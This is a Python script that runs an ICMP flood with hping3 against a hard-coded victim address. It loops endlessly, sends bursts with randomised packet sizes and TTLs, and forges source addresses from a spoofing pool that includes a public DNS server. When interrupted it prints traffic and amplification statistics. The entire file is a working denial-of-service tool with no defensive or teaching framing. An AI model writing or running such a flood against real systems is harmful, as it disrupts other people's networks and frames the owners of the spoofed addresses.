import subprocess
import random
import time
import os

# Optional (used if installed)
try:
    import psutil
    use_psutil = True
except ImportError:
    use_psutil = False

# Configuration
TARGET_IP = "192.168.1.10"      # Victim IP
INTERFACE = "enp0s3"            # Network interface
IP_POOL = [                     # Spoofed IPs
    "10.0.0.1", "10.0.0.2", "192.168.0.100", "172.16.5.5",
    "203.0.113.1", "8.8.8.8", "192.0.2.1", "192.168.1.50"
]

# For stats
def get_iface_stats(interface):
    tx = int(open(f"/sys/class/net/{interface}/statistics/tx_bytes").read())
    rx = int(open(f"/sys/class/net/{interface}/statistics/rx_bytes").read())
    return tx, rx

def get_system_usage():
    if use_psutil:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        return cpu, ram
    return None, None

# Attack burst
def send_icmp_burst(target_ip, packet_size, ttl, spoof_ip, count=10):
    try:
        cmd = f"hping3 -1 {target_ip} -a {spoof_ip} -d {packet_size} -c {count} --ttl {ttl} --fast -I {INTERFACE}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] hping3 failed: {e}")

def main():
    print("[*] Starting ICMP Flood with metrics...")
    tx_start, rx_start = get_iface_stats(INTERFACE)
    time_start = time.time()

    total_bytes_sent = 0
    total_packets_sent = 0

    try:
        while True:
            size = random.choice([512, 1024, 1200, 1400])
            ttl = random.randint(30, 255)
            spoof = random.choice(IP_POOL)
            count = random.randint(10, 30)

            send_icmp_burst(TARGET_IP, size, ttl, spoof, count)

            burst_bytes = size * count
            total_bytes_sent += burst_bytes
            total_packets_sent += count

            print(f"[+] Sent {count} packets ({size} bytes each) | Total: {total_packets_sent} pkts / {total_bytes_sent} bytes")

            time.sleep(random.uniform(0.01, 0.1))  # small burst pause

    except KeyboardInterrupt:
        print("\n[!] Attack stopped. Gathering stats...")
        tx_end, rx_end = get_iface_stats(INTERFACE)
        time_end = time.time()
        duration = time_end - time_start

        tx_diff = tx_end - tx_start
        rx_diff = rx_end - rx_start

        af = round(rx_diff / tx_diff, 2) if tx_diff > 0 else "N/A"
        asymmetry = abs(tx_diff - rx_diff)

        cpu, ram = get_system_usage()

        print("\n=== ICMP Flood Summary ===")
        print(f"Duration: {round(duration, 2)} seconds")
        print(f"Total Packets Sent: {total_packets_sent}")
        print(f"Total Bytes Sent: {total_bytes_sent}")
        print(f"Interface TX (bytes): {tx_diff}")
        print(f"Interface RX (bytes): {rx_diff}")
        print(f"Amplification Factor: {af}")
        print(f"Asymmetric Bandwidth (TX ≠ RX): {asymmetry} bytes")

        if cpu is not None:
            print(f"CPU Usage: {cpu}%")
            print(f"RAM Usage: {ram}%")
        else:
            print("Install `psutil` to get CPU/RAM usage.")

if __name__ == "__main__":
    main()
